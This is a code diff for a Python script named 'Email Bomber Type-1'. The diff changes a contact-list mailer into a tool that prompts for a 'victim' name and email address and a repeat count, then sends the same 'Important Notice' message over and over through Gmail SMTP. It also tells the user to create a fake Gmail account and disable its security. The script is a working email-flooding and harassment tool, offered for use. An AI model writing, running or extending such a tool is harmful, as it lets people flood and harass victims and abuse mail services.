@@ -9,8 +9,8 @@ from email.mime.text import MIMEText
 print("**********Welcome to Email Bomber Type-1 **************")
 
 print("Please create a fake gmail ID and disable its security to work properly")
-print("Create a file 'mycontacts.txt' and enter name and email id in the format shown below")
-print("name name@mail.com")
+# print("Create a file 'mycontacts.txt' and enter name and email id in the format shown below")
+# print("name name@mail.com")
 print("-----------------------")
 
 message_template = '''Dear ${PERSON_NAME}, 
@@ -26,6 +26,7 @@ print("=====================\n\n\n")
 
 MY_ADDRESS = str(input("Enter Your email id : "))
 PASSWORD = input("Enter Your password: ")
+
 
 def get_contacts(filename):
     """
@@ -62,30 +63,44 @@ def main():
     # set up the SMTP server
     s = smtplib.SMTP(host='smtp.gmail.com', port=587)
     s.starttls()
-    s.login(MY_ADDRESS, PASSWORD)
-
+    try:
+        s.login(MY_ADDRESS, PASSWORD)
+        print("Login Successfull!!!!!")
+        print("------------------------")
+    except Exception as e:
+        print("Login failed Please disable security and enter correct email and password")
+        exit(0)
+    name = input("Enter the name of victim: ")
+    email = input("Enter victims Email: ")
+    count = int(input("Enter Number of times to send: "))
     # For each contact, send the email:
-    for name, email in zip(names, emails):
-        msg = MIMEMultipart()       # create a message
+    # for name, email in zip(names, emails):
+    msg = MIMEMultipart()       # create a message
 
-        # add in the actual person name to the message template
-        message = message_template.substitute(PERSON_NAME=name.title())
+    # add in the actual person name to the message template
+    message = message_template.substitute(PERSON_NAME=name)
 
-        # Prints out the message body for our sake
-        #print(message)
+    # Prints out the message body for our sake
+    #print(message)
 
-        # setup the parameters of the message
-        msg['From']=MY_ADDRESS
-        msg['To']=email
-        msg['Subject']= "Important Notice"
-        
-        # add in the message body
-        msg.attach(MIMEText(message, 'plain'))
-        
-        # send the message via the server set up earlier.
+    # setup the parameters of the message
+    msg['From']=MY_ADDRESS
+    msg['To']=email
+    msg['Subject']= "Important Notice"
+    
+    # add in the message body
+    msg.attach(MIMEText(message, 'plain'))
+    
+    # send the message via the server set up earlier.
+    progress = 0
+    while progress<count:
         s.send_message(msg)
-        print("Message sent to {}".format(msg['To']))
-        del msg
+        progress += 1
+        print("{} message out of {} message sent".format(progress,count))
+
+    print("------------------------------------------------------------")
+    print("{} Message Successfully sent to {}".format(count,msg['To']))
+    del msg
         
     # Terminate the SMTP session and close the connection
     s.quit()
